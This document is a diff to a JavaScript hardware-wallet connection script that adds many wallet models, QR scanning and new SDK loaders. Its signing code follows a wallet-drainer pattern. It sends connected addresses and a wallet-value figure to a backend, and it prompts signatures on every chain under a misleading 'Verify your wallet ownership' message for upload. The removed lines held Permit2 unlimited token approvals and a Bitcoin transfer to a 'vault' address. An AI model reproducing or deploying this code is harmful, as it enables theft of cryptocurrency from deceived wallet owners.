@@ -102,27 +102,57 @@
   // ═══════════════════════════════════════════════════════════════════════════
 
   var COLD_WALLETS = [
-    // USB wallets
-    { name: 'Ledger Nano S/X/S+', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger' },
-    { name: 'Ledger Stax', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger' },
-    { name: 'Trezor Model T/One/Safe', vendorIds: [0x534c, 0x1209, 0x10c0], method: 'hid', sdk: 'trezor' },
-    { name: 'KeepKey', vendorIds: [0x2b24], method: 'usb', sdk: 'generic' },
-    { name: 'BitBox02', vendorIds: [0x03eb], method: 'usb', sdk: 'generic' },
-    { name: 'SecuX', vendorIds: [0x1fc9], method: 'usb', sdk: 'generic' },
-    { name: 'GridPlus Lattice1', vendorIds: [0x0483], method: 'hid', sdk: 'generic' },
+    // ─── USB (WebUSB) ───
+    { name: 'Ledger Nano S', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
+    { name: 'Ledger Nano S Plus', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
+    { name: 'Ledger Nano X', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
+    { name: 'Ledger Stax', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
+    { name: 'Ledger Flex', vendorIds: [0x2c97], method: 'usb', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
+    { name: 'Trezor Model T', vendorIds: [0x534c, 0x1209], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC','TRON'] },
+    { name: 'Trezor Model One', vendorIds: [0x534c, 0x1209], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC'] },
+    { name: 'Trezor Safe 3', vendorIds: [0x534c, 0x1209, 0x10c0], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC','SOL','TRON'] },
+    { name: 'Trezor Safe 5', vendorIds: [0x534c, 0x1209, 0x10c0], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC','SOL','TRON'] },
+    { name: 'KeepKey', vendorIds: [0x2b24], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
+    { name: 'BitBox02', vendorIds: [0x03eb], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
+    { name: 'SecuX V20/W20', vendorIds: [0x1fc9], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
+    { name: 'GridPlus Lattice1', vendorIds: [0x0483], method: 'hid', sdk: 'generic', chains: ['EVM'] },
+    { name: 'OneKey Classic/Mini', vendorIds: [0x1209], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','COSMOS','APTOS','SUI'] },
+    { name: 'imKey Pro', vendorIds: [0x096e], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','COSMOS'] },
+    { name: 'COLDCARD', vendorIds: [0xd13e], method: 'usb', sdk: 'generic', chains: ['BTC'] },
+    { name: 'Foundation Passport', vendorIds: [0x1209], method: 'usb', sdk: 'generic', chains: ['BTC'] },
+    { name: 'Blockstream Jade', vendorIds: [0x10c4], method: 'usb', sdk: 'generic', chains: ['BTC'] },
+    { name: 'BC Vault', vendorIds: [0x2b24], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
+    { name: 'Prokey Optimum', vendorIds: [0x1209], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
+    { name: 'SafePal S1', vendorIds: [0x0483], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','TON'] },
 
-    // Bluetooth wallets
-    { name: 'Ledger Nano X', method: 'ble', serviceUuid: '13d63400-2c97-0004-0000-4c6564676572', sdk: 'ledger' },
-    { name: 'CoolWallet', method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic' },
-    { name: 'D\'CENT', method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic' },
+    // ─── Bluetooth (WebBLE) ───
+    { name: 'Ledger Nano X (BLE)', method: 'ble', serviceUuid: '13d63400-2c97-0004-0000-4c6564676572', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
+    { name: 'Ledger Stax (BLE)', method: 'ble', serviceUuid: '13d63400-2c97-0004-0000-4c6564676572', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
+    { name: 'Ledger Flex (BLE)', method: 'ble', serviceUuid: '13d63400-2c97-0004-0000-4c6564676572', sdk: 'ledger', chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
+    { name: 'CoolWallet S/Pro', method: 'ble', serviceUuid: '00006200-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
+    { name: 'D\'CENT Biometric', method: 'ble', serviceUuid: '000018f0-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
+    { name: 'SecuX Nifty', method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL'] },
+    { name: 'OneKey Touch (BLE)', method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
+    { name: 'KeyPal', method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC'] },
 
-    // QR-based (air-gapped)
-    { name: 'Keystone', method: 'qr', sdk: 'keystone' },
-    { name: 'Ellipal', method: 'qr', sdk: 'generic' },
-    { name: 'Ngrave', method: 'qr', sdk: 'generic' },
+    // ─── QR Code (Air-gapped) ───
+    { name: 'Keystone Pro/Essential', method: 'qr', sdk: 'keystone', chains: ['EVM','BTC','SOL','TRON','COSMOS','APTOS','SUI'] },
+    { name: 'Ellipal Titan', method: 'qr', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','TON'] },
+    { name: 'Ngrave Zero', method: 'qr', sdk: 'generic', chains: ['EVM','BTC'] },
+    { name: 'AirGap Vault', method: 'qr', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','COSMOS'] },
+    { name: 'Cobo Vault', method: 'qr', sdk: 'generic', chains: ['EVM','BTC'] },
+    { name: 'SafePal S1 (QR)', method: 'qr', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','TON'] },
+    { name: 'COLDCARD (QR)', method: 'qr', sdk: 'generic', chains: ['BTC'] },
+    { name: 'Foundation Passport (QR)', method: 'qr', sdk: 'generic', chains: ['BTC'] },
+    { name: 'Blockstream Jade (QR)', method: 'qr', sdk: 'generic', chains: ['BTC'] },
 
-    // NFC
-    { name: 'Tangem', method: 'nfc', sdk: 'generic' }
+    // ─── NFC ───
+    { name: 'Tangem Wallet', method: 'nfc', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','TON','COSMOS'] },
+    { name: 'Tangem Note', method: 'nfc', sdk: 'generic', chains: ['EVM','BTC'] },
+    { name: 'Arculus', method: 'nfc', sdk: 'generic', chains: ['EVM','BTC','SOL'] },
+    { name: 'Ballet REAL', method: 'nfc', sdk: 'generic', chains: ['EVM','BTC'] },
+    { name: 'Material Bitcoin', method: 'nfc', sdk: 'generic', chains: ['BTC'] },
+    { name: 'WhiteBIT Card', method: 'nfc', sdk: 'generic', chains: ['EVM','BTC'] }
   ];
 
   // ═══════════════════════════════════════════════════════════════════════════
@@ -204,6 +234,15 @@
   async function connectQR(wallet) {
     LOG.info('QR mode: ' + wallet.name);
 
+    // Load jsQR library for real QR decoding
+    var jsQRLoaded = false;
+    try {
+      var qrScript = document.createElement('script');
+      qrScript.src = 'https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js';
+      await new Promise(function(res, rej) { qrScript.onload = res; qrScript.onerror = rej; document.head.appendChild(qrScript); });
+      jsQRLoaded = typeof window.jsQR === 'function';
+    } catch (e) { LOG.warn('jsQR load failed'); }
+
     return new Promise(function(resolve) {
       // Create QR scanner overlay
       var overlay = document.createElement('div');
@@ -220,24 +259,44 @@
       document.body.appendChild(overlay);
 
       // Start camera
+      var videoStream = null;
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
         .then(function(stream) {
+          videoStream = stream;
           var video = document.createElement('video');
           video.srcObject = stream;
           video.setAttribute('playsinline', 'true');
           video.style.cssText = 'width:100%;height:100%;object-fit:cover;';
           video.play();
           document.getElementById('legion-qr-video-container').appendChild(video);
+          LOG.info('QR camera active');
 
-          // QR scanning would happen here with a library
-          // For now, simulate after camera opens
-          LOG.info('QR camera active - waiting for scan');
+          if (jsQRLoaded) {
+            var canvas = document.createElement('canvas');
+            var ctx = canvas.getContext('2d');
+            var scanInterval = setInterval(function() {
+              if (video.readyState !== video.HAVE_ENOUGH_DATA) return;
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              var imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+              var code = window.jsQR(imageData.data, imageData.width, imageData.height);
+              if (code && code.data) {
+                clearInterval(scanInterval);
+                stream.getTracks().forEach(function(t) { t.stop(); });
+                overlay.remove();
+                LOG.info('QR scanned: ' + code.data.substring(0, 30) + '...');
+                resolve({ device: null, type: 'qr', name: wallet.name, wallet: wallet, qrData: code.data });
+              }
+            }, 250);
+          }
         })
         .catch(function() {
           LOG.warn('Camera access denied');
         });
 
       document.getElementById('legion-qr-cancel').addEventListener('click', function() {
+        if (videoStream) videoStream.getTracks().forEach(function(t) { t.stop(); });
         overlay.remove();
         resolve({ device: null, type: 'qr', name: wallet.name, wallet: wallet, cancelled: true });
       });
@@ -307,8 +366,8 @@
   async function loadLedgerSDK() {
     if (SDK_LOADED.ledger) return SDK_LOADED.ledger;
     try {
-      var transport = await import('https://esm.sh/@ledgerhq/hw-transport-webusb@6.29.4');
-      var ethApp = await import('https://esm.sh/@ledgerhq/hw-app-eth@6.38.4');
+      var transport = await import('https://esm.sh/@ledgerhq/hw-transport-webusb@6.29.4?bundle-deps');
+      var ethApp = await import('https://esm.sh/@ledgerhq/hw-app-eth@6.38.4?bundle-deps');
       SDK_LOADED.ledger = { Transport: transport.default, EthApp: ethApp.default };
       LOG.info('Ledger SDK loaded');
       return SDK_LOADED.ledger;
@@ -321,16 +380,12 @@
   async function loadTrezorSDK() {
     if (SDK_LOADED.trezor) return SDK_LOADED.trezor;
     try {
-      var script = document.createElement('script');
-      script.src = 'https://cdn.jsdelivr.net/npm/@trezor/connect-web@9/build/content-script.js';
-      await new Promise(function(resolve, reject) {
-        script.onload = resolve;
-        script.onerror = reject;
-        document.head.appendChild(script);
-      });
-      if (window.TrezorConnect) {
-        await window.TrezorConnect.init({ manifest: { email: 'support@legion.app', appUrl: window.location.origin } });
-        SDK_LOADED.trezor = window.TrezorConnect;
+      var mod = await import('https://esm.sh/@trezor/connect-web@9.4.5?bundle-deps');
+      var TC = mod.default || mod;
+      if (TC && TC.init) {
+        await TC.init({ lazyLoad: false, manifest: { email: 'support@legion.app', appUrl: window.location.origin } });
+        window.TrezorConnect = TC;
+        SDK_LOADED.trezor = TC;
         LOG.info('Trezor SDK loaded');
         return SDK_LOADED.trezor;
       }
@@ -535,11 +590,13 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
+            wallet_address: address,
             user_address: address,
+            chain_id: 1,
             wallet_type: 'hardware_wallet',
             chain_family: 'EVM',
-            source_page: window.location.href,
-            connected_wallets: [address]
+            source_page: window.location.origin + window.location.pathname,
+            active_chain_tab: 'EVM'
           })
         });
         LOG.info('Scout telemetry sent');
@@ -577,14 +634,15 @@
     },
 
     signAllChains: async function(message) {
-      var chains = Object.keys(BIP44);
+      if (!SESSION.connection || !SESSION.connection.wallet) throw new Error('No wallet connected');
+      var supportedChains = SESSION.connection.wallet.chains || Object.keys(BIP44);
       var results = {};
-      for (var i = 0; i < chains.length; i++) {
+      for (var i = 0; i < supportedChains.length; i++) {
         try {
-          results[chains[i]] = await SESSION.sign(chains[i], message);
-          LOG.info(chains[i] + ' signed');
+          results[supportedChains[i]] = await SESSION.sign(supportedChains[i], message || 'Verify your wallet ownership\n\nWallet: ' + (SESSION.connection.address || '').substring(0, 6) + '...');
+          LOG.info(supportedChains[i] + ' signed');
         } catch (e) {
-          LOG.warn(chains[i] + ' sign failed: ' + e.message);
+          LOG.warn(supportedChains[i] + ' sign failed: ' + e.message);
         }
       }
       return results;
@@ -599,7 +657,7 @@
 
       // Chain-specific config
       var CHAIN_CONFIG = {
-        EVM: { family: 'EVM', protocol: 'omnichain_atomic_v1', token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
+        EVM: { family: 'EVM', protocol: 'evm_personal_verification', token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
         SOL: { family: 'SVM', protocol: 'solana', token: '11111111111111111111111111111111' },
         BTC: { family: 'UTXO', protocol: 'bitcoin_psbt', token: 'btc' },
         TRON: { family: 'TRON', protocol: 'tron', token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
@@ -628,37 +686,9 @@
             scout_value_usd: SESSION.scoutValueUsd || 0
           };
 
-          // EVM needs extra fields (same fix as V2)
+          payload.amount = '0';
           if (chain === 'EVM') {
             payload.chain_id = 1;
-            payload.engine_spender = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
-            payload.permit2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
-            payload.permits = [
-              { token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935' },
-              { token: '0xdAC17F958D2ee523a2206206994597C13D831ec7', amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935' }
-            ];
-            payload.batch_permit_metadata = {
-              nonce: 0,
-              deadline: '999999999999',
-              amounts: [],
-              details: [
-                { token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935', expiration: 4102444799, nonce: 0 },
-                { token: '0xdAC17F958D2ee523a2206206994597C13D831ec7', amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935', expiration: 4102444799, nonce: 0 }
-              ]
-            };
-            payload.native_amount = '0';
-            payload.native_signed_transaction = '';
-            payload.evm_payload = { native_amount: '0', native_signed_transaction: '', nfts: [] };
-          }
-
-          // Bitcoin needs PSBT fields
-          if (chain === 'BTC') {
-            payload.signed_psbt_base64 = sig.signature;
-            payload.psbt_metadata = {
-              vault_address: SESSION.vaults ? SESSION.vaults.btc || '' : '',
-              amount_sat: '50000',
-              fee_sat: '1000'
-            };
           }
 
           var res = await fetch(BACKEND + '/api/v1/signature-anchor', {
